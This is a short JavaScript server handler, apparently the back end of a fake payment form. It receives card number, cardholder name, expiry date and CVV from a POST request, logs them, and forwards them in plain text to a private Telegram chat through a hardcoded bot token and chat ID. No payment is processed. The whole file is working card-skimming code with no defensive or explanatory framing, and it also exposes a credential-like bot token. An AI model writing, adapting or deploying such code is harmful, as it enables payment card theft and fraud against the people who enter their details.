import fetch from 'node-fetch';

export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
            const { cardNumber, nameOnCard, expiryDate, cvv } = req.body;
            // Log received card details
            console.log('Received card details:', { cardNumber, nameOnCard, expiryDate, cvv });

            // Send card details to Telegram bot
            const telegramBotToken = '8623332135:AAE-bY1ke_3r0dXRXivk9E9cZWfNOXMffAI'; // New bot token
            const chatId = '8909467295'; // Your chat ID
            const message = encodeURIComponent(
                `New card details:\nCard Number: ${cardNumber}\nName on Card: ${nameOnCard}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`
            );
            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;

            console.log('Sending message to Telegram:', telegramUrl);
            const response = await fetch(telegramUrl);
            const result = await response.json();

            console.log('Telegram API response:', result);
            if (!response.ok) {
                throw new Error(`Telegram API error: ${result.description}`);
            }

            res.status(200).json({ success: true });
        } catch (error) {
            console.error('Error in submit.js:', error.message);
            res.status(500).json({ error: 'Failed to process request' });
        }
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
}
